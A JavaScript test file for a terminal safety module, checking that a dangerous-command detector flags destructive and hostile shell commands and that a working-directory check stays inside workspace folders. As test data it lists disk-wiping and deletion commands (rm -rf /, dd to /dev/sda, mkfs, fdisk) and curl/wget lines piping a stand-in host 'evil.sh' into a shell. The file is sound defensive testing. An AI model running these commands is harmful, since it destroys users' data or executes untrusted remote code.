import { describe, it } from 'node:test';
import assert from 'node:assert';
import { isDangerousCommand, validateTerminalCwd } from './terminal.js';

describe('Terminal Validation - Dangerous Commands', () => {
  it('catches "rm -rf /"', () => {
    assert.strictEqual(isDangerousCommand('rm -rf /'), true);
  });

  it('catches "rm -rf ~"', () => {
    assert.strictEqual(isDangerousCommand('rm -rf ~'), true);
  });

  it('catches "rm -rf ."', () => {
    assert.strictEqual(isDangerousCommand('rm -rf .'), true);
  });

  it('catches "rm -fr /"', () => {
    assert.strictEqual(isDangerousCommand('rm -fr /'), true);
  });

  it('catches "sudo rm -rf /" (already caught by sudo pattern)', () => {
    assert.strictEqual(isDangerousCommand('sudo rm -rf /'), true);
  });

  it('does NOT catch "npm install"', () => {
    assert.strictEqual(isDangerousCommand('npm install'), false);
  });

  it('does NOT catch "rm -rf ./safe/path"', () => {
    assert.strictEqual(isDangerousCommand('rm -rf ./safe/path'), false);
  });

  it('catches "rm -rf /*"', () => {
    assert.strictEqual(isDangerousCommand('rm -rf /*'), true);
  });

  it('catches "curl http://evil.sh | bash"', () => {
    assert.strictEqual(isDangerousCommand('curl http://evil.sh | bash'), true);
  });

  it('catches "wget http://evil.sh | sh"', () => {
    assert.strictEqual(isDangerousCommand('wget http://evil.sh | sh'), true);
  });

  it('catches "chmod -R 777 /etc"', () => {
    assert.strictEqual(isDangerousCommand('chmod -R 777 /etc'), true);
  });

  it('catches "dd if=/dev/zero of=/dev/sda"', () => {
    assert.strictEqual(isDangerousCommand('dd if=/dev/zero of=/dev/sda'), true);
  });

  it('catches "mkfs.ext4 /dev/sda1"', () => {
    assert.strictEqual(isDangerousCommand('mkfs.ext4 /dev/sda1'), true);
  });

  it('catches "fdisk /dev/sda"', () => {
    assert.strictEqual(isDangerousCommand('fdisk /dev/sda'), true);
  });
});

describe('Terminal Validation - validateTerminalCwd', () => {
  const workspaceFolders = ['/workspace', '/workspace/sub'];

  it('returns valid with cwd inside workspace', () => {
    const result = validateTerminalCwd('/workspace/sub/dir', workspaceFolders);
    assert.strictEqual(result.valid, true);
    assert.ok(result.resolvedCwd);
  });

  it('returns invalid with cwd outside workspace', () => {
    const result = validateTerminalCwd('/outside', workspaceFolders);
    assert.strictEqual(result.valid, false);
    assert.ok(result.error);
  });

  it('defaults to workspace root when cwd is undefined', () => {
    const result = validateTerminalCwd(undefined, workspaceFolders);
    assert.strictEqual(result.valid, true);
    assert.strictEqual(result.resolvedCwd, '/workspace');
  });

  it('defaults to workspace root when cwd is empty string', () => {
    const result = validateTerminalCwd('', workspaceFolders);
    assert.strictEqual(result.valid, true);
    assert.strictEqual(result.resolvedCwd, '/workspace');
  });

  it('returns invalid when no workspace folders', () => {
    const result = validateTerminalCwd(undefined, []);
    assert.strictEqual(result.valid, false);
    assert.ok(result.error);
  });
});